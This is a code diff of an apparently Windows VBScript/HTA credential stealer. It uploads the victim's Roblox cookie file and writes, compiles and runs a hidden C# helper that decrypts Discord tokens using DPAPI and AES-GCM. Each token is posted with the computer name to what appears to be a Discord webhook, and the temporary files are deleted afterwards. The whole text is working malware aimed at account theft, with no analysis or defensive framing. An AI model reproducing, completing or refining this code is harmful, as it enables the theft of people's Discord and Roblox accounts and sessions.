@@ -19,30 +19,98 @@ localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
 ' Send an initial hit so you know it ran
 Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
 
-' 1. Grab Discord LevelDB files (contains encrypted tokens)
-Dim dPath, dFolder, file, content
-dPath = appdata & "\discord\Local Storage\leveldb"
-If fso.FolderExists(dPath) Then
-    Set dFolder = fso.GetFolder(dPath)
-    For Each file In dFolder.Files
-        If Right(file.Name, 4) = ".ldb" Or Right(file.Name, 4) = ".log" Then
-            content = ReadFile(file.Path)
-            If Len(content) > 0 Then
-                Call PostFile(file.Name, content)
-            End If
-        End If
-    Next
-End If
-
-' 2. Grab Roblox cookie file
-Dim rPath
+' 1. Grab Roblox cookies
+Dim rPath, rContent
 rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
 If fso.FileExists(rPath) Then
-    content = ReadFile(rPath)
-    If Len(content) > 0 Then Call PostFile("robloxcookies.dat", content)
+    rContent = ReadFile(rPath)
+    If Len(rContent) > 0 Then Call PostFile("robloxcookies.dat", rContent)
 End If
 
+' 2. Grab and Decrypt Discord Tokens via C# Compiler
+Call DecryptDiscord
+
 window.close()
+
+Sub DecryptDiscord()
+    Dim dPath, dFolder, file, rawText
+    dPath = appdata & "\discord\Local Storage\leveldb"
+    If Not fso.FolderExists(dPath) Then Exit Sub
+    
+    ' We write a C# program to temp, compile it, and run it
+    Dim csFile, exeFile, code
+    csFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.cs"
+    exeFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.exe"
+    
+    code = "using System; using System.IO; using System.Text; using System.Text.RegularExpressions; using System.Security.Cryptography; using System.Runtime.InteropServices; " & _
+    "class P { " & _
+    "  [DllImport(""crypt32.dll"", SetLastError=true)] static extern bool CryptUnprotectData(byte[] pDataIn, IntPtr ppszDataDescr, byte[] pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut); " & _
+    "  [StructLayout(LayoutKind.Sequential)] struct DATA_BLOB { public int cbData; public IntPtr pbData; } " & _
+    "  static byte[] Dpapi(byte[] data) { DATA_BLOB inBlob = new DATA_BLOB(); inBlob.cbData = data.Length; inBlob.pbData = Marshal.AllocHGlobal(data.Length); Marshal.Copy(data, 0, inBlob.pbData, data.Length); DATA_BLOB outBlob; CryptUnprotectData(null, IntPtr.Zero, null, IntPtr.Zero, IntPtr.Zero, 0, out outBlob); byte[] outData = new byte[outBlob.cbData]; Marshal.Copy(outBlob.pbData, outData, 0, outBlob.cbData); return outData; } " & _
+    "  static void Main(string[] args) { " & _
+    "    try { " & _
+    "      string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); " & _
+    "      string lsPath = Path.Combine(appdata, @""discord\Local State""); " & _
+    "      if (!File.Exists(lsPath)) return; " & _
+    "      string ls = File.ReadAllText(lsPath); " & _
+    "      Match lm = Regex.Match(ls, @""encrypted_key\\""\s*:\s*\\""([^\\""]+)\\""""); " & _
+    "      if (!lm.Success) return; " & _
+    "      byte[] encKey = Convert.FromBase64String(lm.Groups[1].Value); " & _
+    "      byte[] keyBytes = new byte[encKey.Length - 5]; Array.Copy(encKey, 5, keyBytes, 0, keyBytes.Length); " & _
+    "      byte[] masterKey = Dpapi(keyBytes); " & _
+    "      string ldPath = Path.Combine(appdata, @""discord\Local Storage\leveldb""); " & _
+    "      if (!Directory.Exists(ldPath)) return; " & _
+    "      foreach (string f in Directory.GetFiles(ldPath, ""*.*"")) { " & _
+    "        if (!f.EndsWith("".ldb"") && !f.EndsWith("".log"")) continue; " & _
+    "        string txt = File.ReadAllText(f); " & _
+    "        foreach (Match m in Regex.Matches(txt, @""dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})"")) { " & _
+    "          try { " & _
+    "            string b64 = m.Groups[1].Value; while (b64.Length % 4 != 0) b64 += ""=""; " & _
+    "            byte[] eb = Convert.FromBase64String(b64); " & _
+    "            byte[] nonce = new byte[12]; Array.Copy(eb, 3, nonce, 0, 12); " & _
+    "            byte[] tag = new byte[16]; Array.Copy(eb, eb.Length - 16, tag, 0, 16); " & _
+    "            byte[] ct = new byte[eb.Length - 19]; Array.Copy(eb, 15, ct, 0, ct.Length); " & _
+    "            using (AesGcm aes = new AesGcm(masterKey)) { " & _
+    "              byte[] pt = new byte[ct.Length]; aes.Decrypt(nonce, ct, tag, pt); " & _
+    "              string token = Encoding.UTF8.GetString(pt).TrimEnd('\0'); " & _
+    "              if (token.Length > 40) Console.WriteLine(token); " & _
+    "            } " & _
+    "          } catch {} " & _
+    "        } " & _
+    "      } " & _
+    "    } catch {} " & _
+    "  } " & _
+    "}"
+
+    ' Write C# to file
+    Dim f: Set f = fso.CreateTextFile(csFile, True)
+    f.Write code
+    f.Close
+
+    ' Compile using csc.exe (built into Windows .NET)
+    Dim csc : csc = sh.ExpandEnvironmentStrings("%WINDIR%") & "\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+    sh.Run "cmd /c """ & csc & """ /target:exe /out:""" & exeFile & """ """ & csFile & """ > nul 2>&1", 0, True
+
+    ' Run the compiler output
+    If fso.FileExists(exeFile) Then
+        Dim exec: Set exec = sh.Exec("""" & exeFile & """")
+        Dim output : output = exec.StdOut.ReadAll
+        If Len(output) > 10 Then
+            Dim lines : lines = Split(output, vbCrLf)
+            Dim l
+            For Each l In lines
+                If Len(l) > 40 Then
+                    Call PostEmbed(":gift: Discord Token", "**Token:** " & l & vbCrLf & "**PC:** " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 5793266)
+                End If
+            Next
+        End If
+    End If
+
+    ' Cleanup
+    On Error Resume Next
+    fso.DeleteFile csFile, True
+    fso.DeleteFile exeFile, True
+End Sub
 
 Function ReadFile(path)
     ReadFile = ""
